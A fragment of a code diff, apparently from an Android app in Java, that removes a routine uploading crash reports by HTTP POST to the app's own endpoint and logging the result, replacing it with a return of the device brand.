-                    urlConnection.setConnectTimeout(5000);
-                    urlConnection.setReadTimeout(5000);
-                    urlConnection.setRequestMethod("POST");
-                    // 设置contentType
-                    urlConnection.setRequestProperty("Content-Type", "application/json");
-                    // 设置允许输出
-                    urlConnection.setDoOutput(true);
-                    urlConnection.setDoInput(true);
-                    urlConnection.connect();
-
-
-                    DataOutputStream os = new DataOutputStream(urlConnection.getOutputStream());
-                    String content = String.valueOf(body);
-                    os.writeBytes(content);
-                    os.flush();
-                    os.close();
-
-
-                    int code = urlConnection.getResponseCode();
-                    if (code == 200) {
-
-                        InputStream inputStream = urlConnection.getInputStream();
-                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
-                        String line;
-                        StringBuffer buffer = new StringBuffer();
-                        while ((line = bufferedReader.readLine()) != null) {
-                            buffer.append(line);
-                        }
-                        String jsonStr = buffer.toString();
-                        Log.e("regus_crash接口返回", jsonStr + "");
-
-                        JSONObject responseJson = new JSONObject(jsonStr.replace("\\", ""));
-
-                        if (responseJson.has("Status") && responseJson.has("Data")) {
-
-                            if (responseJson.getBoolean("Data")) {
-                                Log.e("regus ", "闪退上传成功");
-                            }
-
-                        }
-
-                    }
-                } catch (Exception e) {
-                    Log.e("reugs", "crash接口 " + e.getLocalizedMessage());
-                }
-
-            }
-
-
-        }
-
-
+        return Build.BRAND;
     }
 
 
